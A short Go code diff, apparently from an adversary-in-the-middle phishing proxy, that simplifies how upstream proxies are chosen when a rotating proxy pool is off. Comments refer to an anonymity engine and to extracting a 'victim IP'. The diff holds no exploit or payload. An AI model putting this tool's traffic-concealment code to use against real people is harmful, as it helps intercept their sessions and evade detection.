@@ -284,25 +284,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		// Check if proxy pool is enabled
 		if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil || !p.anonymityEngine.proxyRotator.IsEnabled() {
 			// Pool not enabled - fall back to single proxy config or direct
-			if p.cfg.proxyConfig.Enabled {
-				proxyType := p.cfg.proxyConfig.Type
-				if proxyType == "" {
-					proxyType = "http"
-				}
-				// Only return proxy URL for HTTP/HTTPS proxies
-				// SOCKS5 is handled by Tr.Dial
-				if strings.HasPrefix(proxyType, "http") {
-					proxyURL := &url.URL{
-						Scheme: proxyType,
-						Host:   fmt.Sprintf("%s:%d", p.cfg.proxyConfig.Address, p.cfg.proxyConfig.Port),
-					}
-					if p.cfg.proxyConfig.Username != "" {
-						proxyURL.User = url.UserPassword(p.cfg.proxyConfig.Username, p.cfg.proxyConfig.Password)
-					}
-					return proxyURL, nil
-				}
-			}
-			return nil, nil // Direct connection or SOCKS5 (handled by Dial)
+			// SOCKS5 and HTTP/HTTPS are handled by Tr.Dial in setProxy
+			return nil, nil // Direct connection or Single Proxy (handled by Dial)
 		}
 
 		// Extract victim IP from request
